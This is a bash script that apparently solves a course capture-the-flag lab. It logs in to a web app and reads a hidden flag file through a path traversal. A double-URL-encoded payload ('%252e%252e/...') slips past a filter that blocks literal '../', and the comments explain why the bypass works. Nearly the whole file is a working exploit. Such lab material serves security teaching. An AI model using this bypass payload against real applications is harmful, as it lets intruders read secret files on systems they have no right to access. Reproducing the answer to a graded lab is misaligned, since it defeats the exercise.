#!/usr/bin/env bash
# Vuln 4: Path Traversal via double-URL-encoded bypass
#
# The WAF blocks literal "../" in the filename parameter.
# But the download handler runs urllib.parse.unquote() on the filename
# AFTER the WAF check, creating a TOCTOU bypass:
#
#   1. Attacker sends: %2e%2e/%2e%2e/.secrets/pt_flag.txt
#      (URL-encoded "../" → Flask auto-decodes query string → arrives as literal "../")
#      → WAF catches this → 403
#
#   2. Attacker sends: %252e%252e/%252e%252e/.secrets/pt_flag.txt
#      (double-encoded → Flask decodes to "%2e%2e/%2e%2e/.secrets/pt_flag.txt")
#      → WAF sees "%2e%2e/..." (no literal "../") → PASSES
#      → Handler's unquote() decodes "%2e%2e/" to "../" → traversal works
#
# The real flag is at /app/.secrets/pt_flag.txt (not /app/flag.txt which is a decoy).
# From /app/data/uploads/, need ../../.secrets/pt_flag.txt
#
URL="${1:-http://localhost}"
LOGIN_USER="${2:-admin}"
LOGIN_PASS="${3:-supercalifragilisticexpialidociousandthequickbrownfoxjumpsoverthelazydog}"

COOKIE_JAR="$(mktemp)"
trap 'rm -f "$COOKIE_JAR"' EXIT

# Login
curl -sf -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST \
  -d "username=${LOGIN_USER}&password=${LOGIN_PASS}" \
  "${URL}/login" -o /dev/null -L 2>/dev/null

# Double-URL-encoded path traversal:
# ../../.secrets/pt_flag.txt → %252e%252e/%252e%252e/.secrets/pt_flag.txt
PAYLOAD="%252e%252e/%252e%252e/.secrets/pt_flag.txt"

RESP=$(curl -sf -b "$COOKIE_JAR" "${URL}/download?file=${PAYLOAD}" 2>/dev/null)
echo "$RESP" | grep -oE 'ENPM634\{[^}]+\}' | head -1
